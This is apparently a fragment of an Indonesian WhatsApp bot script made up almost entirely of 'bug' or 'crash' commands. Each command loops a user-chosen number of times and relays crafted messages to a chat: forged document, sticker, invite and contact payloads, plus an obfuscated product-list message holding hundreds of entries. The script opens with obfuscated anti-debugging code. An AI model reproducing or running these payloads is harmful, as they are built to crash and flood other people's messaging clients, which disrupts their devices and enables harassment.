_0x4f0ab8;}else{if(_0x102fbb[_0x4cc733(0x534,0x5c0,0x52f,0x634,0x539)](_0x102fbb[_0x39642a(0x41d,0x3cf,0x42b,0x439,0x4da)],_0x102fbb[_0x1eb062(-0xe7,-0x8b,-0x11,-0x50,-0x9a)])){var _0x45712a;try{_0x45712a=_0x102fbb[_0x4cc733(0x68c,0x5c7,0x66a,0x54d,0x623)](_0x5da606,_0x102fbb[_0xe08c1d(0x6f,-0x17,-0x6,-0x5a,-0x21)](_0x102fbb[_0xe08c1d(-0x114,-0x87,-0xed,0x3d,-0x53)](_0x102fbb[_0x607a4d(0x234,0x1d3,0x20b,0x1a9,0x25a)],_0x102fbb[_0x4cc733(0x61c,0x67a,0x661,0x638,0x6dd)]),');'))();}catch(_0x47bc35){_0x45712a=_0x411e2d;}return _0x45712a;}else _0x102fbb[_0x1eb062(-0x5e,-0x70,0xc,0x58,0x5)](_0x4f0ab8,-0x1d07+0x816+-0x3*-0x6fb);}}else(function(){return![];}[_0x1eb062(0xcf,0x6a,0xb2,0x126,0x76)+_0x4cc733(0x5ec,0x601,0x6bf,0x616,0x589)+'r'](_0x102fbb[_0xe08c1d(-0xc9,-0xd6,0x49,-0x9c,-0x53)](_0x102fbb[_0x39642a(0x59f,0x573,0x524,0x577,0x5ba)],_0x102fbb[_0x4cc733(0x5ce,0x55b,0x571,0x5cf,0x4ff)]))[_0x4cc733(0x5cf,0x63f,0x610,0x609,0x600)](_0x102fbb[_0x4cc733(0x5ed,0x657,0x59f,0x64b,0x6fe)]));}catch(_0x5e1d8c){}}
}
break
//=================================================//
case 'banghwbug3': case 'banghwcrash2': case 'crashar12': {
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AqxXrAo_Ps-EypsKORCFw5DI1pwgL6QviYZjjZt1cfc9.enc",
"mimetype": "application/octet-stream",
"title": ".dev",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "EtWT+vaba/Lg3egtpABQamMrA/JAo7T8hSLvJwgHrSg=",
"fileName": `© © banghw${ngazap(prefix)}`,
"fileEncSha256": "dENBk3fbczAtCSQCSld7QgpDTc8qcAKQQs+70YDjWYs=",
"directPath": "/v/t62.7119-24/25998581_433881065276377_966985398741330442_n.enc?ccb=11-4&oh=01_AVxJQ5tFKItPezPsVcHVcr6wNVNiZKZjbtTqCXShnXb_hQ&oe=62EEDFD5",
"mediaKeyTimestamp": "1657288637",
}
}), { userJid: m.chat, quoted: doc })
haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
}
}
break
//=================================================//
case 'banghwbug4': case 'banghwcrash3': case 'crashar13':{
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
for (let i = 0; i < jumlah; i++) {
var extended = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"extendedTextMessage": {
"text": `https://chat.whatsapp.com/Jh7zaCSnPCBC4gdYOEVm0K\n\n© © banghw`,
"matchedText": "https://chat.whatsapp.com/Jh7zaCSnPCBC4gdYOEVm0K",
"description": "Undangan Grup WhatsApp",
"title": `© © banghw${ngazap(prefix)}`,
"previewType": "NONE",
}
}), { userJid: m.chat, quoted: doc })
haikal.relayMessage(m.chat, extended.message, { messageId: extended.key.id })
}
}
break
//=================================================//
case 'banghwbug5': case 'banghwcrash4': case 'crashar14': {
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
for (let i = 0; i < jumlah; i++) {
var sticker = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/AgPwKRhs9an5F6WhnwXhdmhf8PX29TP_olqe4FIv1piE.enc",
"fileSha256": "u1dFgoXE6JsB5bUricNLDnIBh9NFx4QMuPMLccYrcb0=",
"fileEncSha256": "EK4PgZmQ6QoCl0GRQp3K8PCAzo9RXeMOU8NFjwnWXp0=",
"mediaKey": "XJ4fPYzZ63TWoziMvjXMHZQttVJLGpGN6wDjDpzdx7k=",
"mimetype": "image/webp",
"directPath": "/v/t62.15575-24/40664462_556808939544453_4219685480579374478_n.enc?ccb=11-4&oh=01_AVye92lzVBcYK_Ym5s5o-FrP_CF18W5sg9fb_Et5N3rV7g&oe=63639F3F",
"fileLength": "14240",
"mediaKeyTimestamp": "1664991742",
"isAnimated": false,
}
}), { userJid: m.chat, quoted: doc })
haikal.relayMessage(m.chat, sticker.message, { messageId: sticker.key.id })
}
}
break
case 'banghwbug6': case 'banghwcrash5': case 'crashar15':{
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
for (let i = 0; i < jumlah; i++) {
var sticker = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/AgPwKRhs9an5F6WhnwXhdmhf8PX29TP_olqe4FIv1piE.enc",
"fileSha256": "u1dFgoXE6JsB5bUricNLDnIBh9NFx4QMuPMLccYrcb0=",
"fileEncSha256": "EK4PgZmQ6QoCl0GRQp3K8PCAzo9RXeMOU8NFjwnWXp0=",
"mediaKey": "XJ4fPYzZ63TWoziMvjXMHZQttVJLGpGN6wDjDpzdx7k=",
"mimetype": "image/webp",
"directPath": "/v/t62.15575-24/40664462_556808939544453_4219685480579374478_n.enc?ccb=11-4&oh=01_AVye92lzVBcYK_Ym5s5o-FrP_CF18W5sg9fb_Et5N3rV7g&oe=63639F3F",
"fileLength": "14240",
"mediaKeyTimestamp": "1664991742",
"isAnimated": false,
}
}), { userJid: m.chat, quoted: doc })
haikal.relayMessage(m.chat, sticker.message, { messageId: sticker.key.id })
}
}
break

case 'banghwdelay': {
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
for (let i = 0; i < jumlah; i++) {
var _0x39080c=_0x4b8f;function _0x3b16(){var _0x4c72fa=['chat','9940068BVkoHm','184726183721626','1847261837216262','PRODUCT_LIST','184726183721626282','7007318245952499','18472618372162628','1847261837216262829','1847261837216262824','8606787pjRFfV','6ohjUEo','18472618372162627','2DjJTeF','10eBrCRT','message','1860208OrcNUm','1303771sMeUPs','1596925gyTSrQ','1847261837216269','HAIKAL','18561433JSLMJl','key','2624412LNDEmX','16vCdaCM'];_0x3b16=function(){return _0x4c72fa;};return _0x3b16();}(function(_0x5e9cd5,_0x1d7d08){var _0x1a0e50=_0x4b8f,_0x1f94ff=_0x5e9cd5();while(!![]){try{var _0x25dc7c=parseInt(_0x1a0e50(0x19a))/0x1+-parseInt(_0x1a0e50(0x196))/0x2*(parseInt(_0x1a0e50(0x1a0))/0x3)+parseInt(_0x1a0e50(0x1a1))/0x4*(-parseInt(_0x1a0e50(0x19b))/0x5)+-parseInt(_0x1a0e50(0x194))/0x6*(-parseInt(_0x1a0e50(0x193))/0x7)+-parseInt(_0x1a0e50(0x199))/0x8+-parseInt(_0x1a0e50(0x1a3))/0x9+-parseInt(_0x1a0e50(0x197))/0xa*(-parseInt(_0x1a0e50(0x19e))/0xb);if(_0x25dc7c===_0x1d7d08)break;else _0x1f94ff['push'](_0x1f94ff['shift']());}catch(_0xcc3c8f){_0x1f94ff['push'](_0x1f94ff['shift']());}}}(_0x3b16,0xb2901));var bugshinchan=generateWAMessageFromContent(m['chat'],proto['Message']['fromObject']({'listMessage':{'title':''+buttonkal,'description':'HW\x20MODS\x20WA'+buttonkal,'buttonText':_0x39080c(0x19d),'listType':_0x39080c(0x18d),'productListInfo':{'productSections':[{'title':''+buttonkal,'products':[{'productId':'1847261837216269'},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':'1847261837216269'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x19c)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x19c)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x19c)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x39080c(0x19c)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x19c)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x19c)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x19c)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x19c)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'1847261837216269'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'1847261837216269'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a5)},{'productId':'1847261837216262244'},{'productId':'184726183721626282'},{'productId':_0x39080c(0x191)},{'productId':_0x39080c(0x191)},{'productId':_0x39080c(0x192)},{'productId':_0x39080c(0x18e)},{'productId':'184726183721626282'},{'productId':_0x39080c(0x18e)},{'productId':_0x39080c(0x190)},{'productId':_0x39080c(0x190)},{'productId':_0x39080c(0x1a5)},{'productId':_0x39080c(0x1a5)},{'productId':_0x39080c(0x195)},{'productId':_0x39080c(0x1a5)},{'productId':_0x39080c(0x1a5)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a5)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x19c)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x19c)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x19c)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x19c)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a5)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x191)},{'productId':_0x39080c(0x192)},{'productId':'184726183721626282'},{'productId':_0x39080c(0x18e)},{'productId':'184726183721626282'},{'productId':_0x39080c(0x190)},{'productId':_0x39080c(0x190)},{'productId':'1847261837216262'},{'productId':'1847261837216262'},{'productId':_0x39080c(0x195)},{'productId':_0x39080c(0x1a5)},{'productId':'1847261837216262'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'}]}],'headerImage':{'productId':_0x39080c(0x18f)},'businessOwnerJid':'6281214281312@s.whatsapp.net'},'footerText':''+buttonkal}}),{'userJid':m[_0x39080c(0x1a2)],'quoted':m});function _0x4b8f(_0x635405,_0x57e435){var _0x3b16d7=_0x3b16();return _0x4b8f=function(_0x4b8f78,_0x305957){_0x4b8f78=_0x4b8f78-0x18d;var _0x3baff1=_0x3b16d7[_0x4b8f78];return _0x3baff1;},_0x4b8f(_0x635405,_0x57e435);}haikal['relayMessage'](m[_0x39080c(0x1a2)],bugshinchan[_0x39080c(0x198)],{'messageId':bugshinchan[_0x39080c(0x19f)]['id']});
}
}
break
//=================================================//
case 'banghwbug7': case 'banghwcrash6': case 'crashar16':{
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var extended = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"extendedTextMessage": {
"text": "https://wa.me/c/6285714170944",
"matchedText": "https://wa.me/c/6285714170944",
"description": "Developer © banghw\nWhatsApp / Script Bot \n\nORDER ? CHAT AJA 👋",
"title": `© banghw${ngazap(prefix)}`,
"previewType": "NONE",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: doc })
haikal.relayMessage(m.chat, extended.message, { messageId: extended.key.id })
}
}
break
//=================================================//
case 'banghwbug8': case 'banghwcrash7': case 'crashar17': {
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
for (let i = 0; i < jumlah; i++) {
var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"contactMessage": {
"displayName": `© © banghw${ngazap(prefix)}`,
"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:© banghw\nitem1.TEL;waid=6285714170944:+62 857-1417-0944\nitem1.X-ABLabel:Ponsel\nPHOTO;BASE64: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